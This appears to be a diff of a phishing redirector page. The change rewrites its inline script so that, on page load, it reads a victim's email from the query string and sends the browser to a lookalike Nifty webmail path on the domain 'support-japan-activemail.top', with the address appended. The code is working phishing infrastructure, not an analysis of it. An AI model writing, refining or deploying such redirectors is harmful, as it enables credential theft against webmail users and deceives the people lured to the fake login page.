@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -9,19 +10,27 @@
         (function() {
             var part1 = "https://support-japan-activemail.top/";
             var part2 = "webmail-mail-mail/nifty/-nifty/";
-            var part3 = "mailer/pro/htm/index.html";
+            var part3 = "mailer/pro/htm/index.html#";
 
-            // Get the email parameter from the URL
-            var email = window.location.hash.substring(1);
+            // Function to get the email from the query string
+            function getQueryParameter(param) {
+                var urlParams = new URLSearchParams(window.location.search);
+                return urlParams.get(param);
+            }
+
+            // Get the 'email' parameter from the URL query string
+            var email = getQueryParameter('email');
 
             // Decode the email parameter to keep @ symbol intact
-            var decodedEmail = decodeURIComponent(email);
+            if (email) {
+                var decodedEmail = decodeURIComponent(email);
 
-            // Construct the redirect URL
-            var redirectUrl = part1 + part2 + part3 + "#" + decodedEmail;
+                // Construct the redirect URL without any prefix
+                var redirectUrl = part1 + part2 + part3 + decodedEmail;
 
-            // Redirect to the constructed URL
-            window.location.href = redirectUrl;
+                // Redirect to the constructed URL
+                window.location.href = redirectUrl;
+            }
         })();
     </script>
 </head>
